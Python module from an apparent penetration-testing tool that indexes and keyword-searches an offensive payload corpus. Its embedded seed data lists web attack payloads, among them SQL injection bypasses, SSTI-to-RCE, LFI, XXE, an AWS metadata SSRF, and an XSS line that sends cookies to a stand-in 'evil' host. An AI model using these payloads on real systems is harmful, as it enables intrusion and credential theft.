"""knowledge/technique_search.py — lexical technique/payload search (Gap #3).

A fast, deterministic, OFFLINE keyword search over ARGUS's offensive corpus
(HackTricks + PayloadsAllTheThings, fetched by ``fetch_offensive_corpus.py`` into
``knowledge/data/``).  It complements the existing ChromaDB *semantic* RAG: when the
operator already knows the vulnerability class and wants the EXACT payload / bypass /
command, a lexical SQLite-FTS5 lookup (the model AIRecon calls ``dataset_search``)
beats a fuzzy vector match and needs no embedding model.

Design:
  • build_index() chunks the corpus markdown by section into an FTS5 table.
  • technique_search() runs a sanitised MATCH ranked by bm25.
  • Degrades gracefully every step: no FTS5 in this SQLite → a LIKE fallback; no
    fetched corpus → a small embedded SEED_CORPUS so the tool is always useful and
    unit-testable; no DB yet → it is built on first search.

Nothing in ARGUS depends on this module — it is a pure, additive capability.
"""
from __future__ import annotations

import logging
import os
import re
import sqlite3
from pathlib import Path
from typing import Any, Dict, List, Optional

logger = logging.getLogger("argus.technique_search")

_HERE = Path(__file__).resolve().parent
DATA_DIR = _HERE / "data"
DB_PATH = str(DATA_DIR / "technique_index.db")

#: (category-prefix, sub-directory under knowledge/data) of each corpus.
_CORPUS_DIRS = [("hacktricks", "hacktricks"),
                ("payloads", "PayloadsAllTheThings")]

#: A compact, embedded fallback so the tool works (and is testable) even before the
#: multi-GB corpus is fetched.  One entry per common web/vuln class.
SEED_CORPUS: List[Dict[str, str]] = [
    {"title": "SQL Injection — authentication bypass", "category": "sqli",
     "content": "' OR '1'='1' --   ' OR 1=1#   admin'--   bypass a login form. "
                "Confirm with sqlmap -u URL --batch; dump with --dump. UNION SELECT to extract."},
    {"title": "SQL Injection — UNION-based extraction", "category": "sqli",
     "content": "ORDER BY to find column count, then UNION SELECT NULL,version(),NULL. "
                "information_schema.tables / columns to enumerate. Use --technique=U in sqlmap."},
    {"title": "Server-Side Template Injection (SSTI)", "category": "ssti",
     "content": "{{7*7}} returns 49 in Jinja2/Twig. {{config}} and "
                "{{''.__class__.__mro__[1].__subclasses__()}} lead to Python RCE. "
                "${7*7} for Freemarker/Velocity; <%= 7*7 %> for ERB."},
    {"title": "Local File Inclusion (LFI)", "category": "lfi",
     "content": "../../../../etc/passwd path traversal. "
                "php://filter/convert.base64-encode/resource=index.php to read source. "
                "/proc/self/environ and access-log poisoning for LFI-to-RCE."},
    {"title": "Cross-Site Scripting (XSS)", "category": "xss",
     "content": "<script>alert(1)</script>   <img src=x onerror=alert(1)>   "
                "<svg/onload=alert(1)>. DOM XSS via innerHTML/location. Steal cookies "
                "with fetch('//evil/?c='+document.cookie)."},
    {"title": "OS Command Injection", "category": "command-injection",
     "content": "; id   | id   `id`   $(id)   && whoami   %0a newline. "
                "Bypass space filters with ${IFS}. Blind: use DNS/HTTP out-of-band callbacks."},
    {"title": "XML External Entity (XXE)", "category": "xxe",
     "content": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo> "
                "to read files; SYSTEM 'http://internal' for SSRF; OOB exfil via parameter entities."},
    {"title": "Insecure Deserialization", "category": "deserialization",
     "content": "Java: ysoserial gadget chains (CommonsCollections). Python: object "
                "deserialization __reduce__ for RCE. PHP: unserialize() POP chains. "
                ".NET: ViewState / Json.NET TypeNameHandling."},
    {"title": "Server-Side Request Forgery (SSRF)", "category": "ssrf",
     "content": "http://169.254.169.254/latest/meta-data/ for AWS creds. gopher:// to reach "
                "internal Redis/SMTP. Bypass filters with decimal IP, [::], DNS rebinding."},
    {"title": "Authentication / JWT attacks", "category": "auth",
     "content": "alg:none JWT forgery; weak HMAC secret crackable with hashcat -m 16500. "
                "kid path traversal. Reuse of refresh tokens; session fixation; IDOR on user id."},
    {"title": "File upload to RCE", "category": "upload",
     "content": "Upload a .php/.jsp/.aspx webshell; bypass with double extension shell.php.jpg, "
                "magic bytes, Content-Type spoof, .htaccess handler, null byte shell.php%00.jpg."},
]


# ── Index build ───────────────────────────────────────────────────────────────
_SECTION_RE = re.compile(r"^#{1,3}\s+(.*)$", re.M)


def _fts5_available(con: sqlite3.Connection) -> bool:
    try:
        con.execute("CREATE VIRTUAL TABLE IF NOT EXISTS _fts_probe USING fts5(x)")
        con.execute("DROP TABLE IF EXISTS _fts_probe")
        return True
    except sqlite3.Error:
        return False


def _iter_corpus_chunks(data_dir: Path):
    """Yield (title, category, source, content) chunks from the fetched markdown."""
    for cat_prefix, sub in _CORPUS_DIRS:
        root = data_dir / sub
        if not root.exists():
            continue
        for md in root.rglob("*.md"):
            try:
                text = md.read_text(encoding="utf-8", errors="ignore")
            except Exception:
                continue
            rel = str(md.relative_to(data_dir))
            # Split into sections on markdown headings; keep the heading as the title.
            parts = _SECTION_RE.split(text)
            # parts = [pre, h1, body1, h2, body2, ...]
            if len(parts) <= 1:
                yield (md.stem, cat_prefix, rel, text[:4000])
                continue
            it = iter(parts[1:])
            for title, body in zip(it, it):
                body = (body or "").strip()
                if len(body) < 20:
                    continue
                yield (title.strip()[:200], cat_prefix, rel, body[:4000])


def build_index(db_path: str = DB_PATH, data_dir: Optional[Path] = None,
                force: bool = False) -> Dict[str, Any]:
    """(Re)build the FTS5 technique index.  Uses the fetched corpus if present, else
    the embedded SEED_CORPUS.  Returns {built, rows, source, fts5}."""
    data_dir = Path(data_dir) if data_dir else DATA_DIR
    try:
        os.makedirs(os.path.dirname(db_path) or ".", exist_ok=True)
    except Exception:
        pass
    con = sqlite3.connect(db_path)
    try:
        fts = _fts5_available(con)
        con.execute("DROP TABLE IF EXISTS techniques")
        if fts:
            con.execute("CREATE VIRTUAL TABLE techniques USING fts5("
                        "title, category, source, content)")
        else:
            con.execute("CREATE TABLE techniques "
                        "(title TEXT, category TEXT, source TEXT, content TEXT)")

        rows = list(_iter_corpus_chunks(data_dir))
        source = "corpus"
        if not rows:
            rows = [(e["title"], e["category"], "seed", e["content"]) for e in SEED_CORPUS]
            source = "seed"
        con.executemany("INSERT INTO techniques(title, category, source, content) "
                        "VALUES (?,?,?,?)", rows)
        con.commit()
        return {"built": True, "rows": len(rows), "source": source, "fts5": fts}
    finally:
        con.close()


# ── Search ────────────────────────────────────────────────────────────────────
def _fts_match_query(query: str) -> Optional[str]:
    """Build an injection-safe FTS5 MATCH expression: alphanumeric terms only, each
    quoted, OR-joined so bm25 ranks docs matching more terms higher."""
    terms = [t for t in re.findall(r"[A-Za-z0-9_]+", str(query or "")) if len(t) > 1][:12]
    if not terms:
        return None
    return " OR ".join(f'"{t}"' for t in terms)


def _like_search(con: sqlite3.Connection, query: str, k: int) -> List[Dict[str, Any]]:
    terms = [t.lower() for t in re.findall(r"[A-Za-z0-9_]+", query) if len(t) > 1][:12]
    if not terms:
        return []
    rows = con.execute("SELECT title, category, source, content FROM techniques").fetchall()
    scored = []
    for title, category, source, content in rows:
        hay = f"{title} {content}".lower()
        score = sum(hay.count(t) for t in terms)
        if score:
            scored.append((score, title, category, source, content))
    scored.sort(key=lambda r: -r[0])
    return [{"title": t, "category": c, "source": s, "score": float(sc),
             "snippet": (ct or "")[:240]} for sc, t, c, s, ct in scored[:k]]


def technique_search(query: str, k: int = 8, db_path: str = DB_PATH) -> List[Dict[str, Any]]:
    """Return up to ``k`` techniques/payloads matching ``query``, ranked best-first.
    Builds the index on first use; degrades to a LIKE scan if FTS5 is unavailable.
    Never raises — returns [] on any failure."""
    try:
        if not os.path.exists(db_path):
            build_index(db_path)
        con = sqlite3.connect(db_path)
    except Exception as exc:
        logger.debug("technique_search: cannot open index: %s", exc)
        return []
    try:
        try:
            con.execute("SELECT 1 FROM techniques LIMIT 1")
        except sqlite3.Error:
            con.close()
            build_index(db_path)
            con = sqlite3.connect(db_path)

        match = _fts_match_query(query)
        if match is None:
            return []
        try:
            cur = con.execute(
                "SELECT title, category, source, "
                "snippet(techniques, 3, '', '', ' … ', 18) AS snip, "
                "bm25(techniques) AS rank "
                "FROM techniques WHERE techniques MATCH ? ORDER BY rank LIMIT ?",
                (match, k))
            out = [{"title": r[0], "category": r[1], "source": r[2],
                    "snippet": (r[3] or "")[:240], "score": round(-float(r[4]), 3)}
                   for r in cur.fetchall()]
            if out:
                return out
            return _like_search(con, query, k)        # FTS found nothing → widen
        except sqlite3.Error:
            return _like_search(con, query, k)         # no FTS5 in this SQLite
    except Exception as exc:
        logger.debug("technique_search failed: %s", exc)
        return []
    finally:
        try:
            con.close()
        except Exception:
            pass
